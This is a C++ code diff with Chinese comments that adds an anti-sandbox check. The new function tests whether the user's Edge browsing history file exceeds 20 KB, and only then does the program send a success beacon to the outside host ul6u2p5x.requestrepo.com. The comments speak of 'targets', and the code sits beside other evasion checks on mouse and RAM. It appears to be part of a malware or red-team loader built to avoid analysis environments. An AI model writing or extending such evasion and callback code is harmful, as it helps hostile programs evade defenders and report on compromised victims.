@@ -132,9 +132,49 @@ bool check_mouse() {
         return false;
     }
 }
+std::string wstringToString(const std::wstring& wstr) {
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+    std::string strTo(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
+    return strTo;
+}
+//判断edge浏览器的本地浏览记录是否大于20kb,建议在win10及以上的目标启用
+bool check_edge() {
+    wchar_t username[256 + 1];
+    DWORD username_len = 256 + 1;
+    GetUserName(username, &username_len);
+    std::string uname = wstringToString(username);
+    std::string filePath = "C:\\Users\\" + uname + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History";
+    // 检查文件是否存在
+    if (GetFileAttributesA(filePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+        // 文件不存在
+        return FALSE;
+    }
+    // 获取文件大小
+    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        // 无法打开文件
+        return FALSE;
+    }
+    LARGE_INTEGER fileSize;
+    if (!GetFileSizeEx(hFile, &fileSize)) {
+        // 获取文件大小失败
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    CloseHandle(hFile);
+    // 比较文件大小与20KB
+    const DWORDLONG TwentyKB = 20 * 1024;
+    if (fileSize.QuadPart > TwentyKB) {
+        return TRUE;
+    }
+    else {
+        return FALSE;
+    }
+}
 int main() {
     //用于提示已经成功执行
-    if (check_ram()) {
+    if (check_edge()) {
         auto url = "ul6u2p5x.requestrepo.com";
         httplib::Client cli(url);
         httplib::Params p;
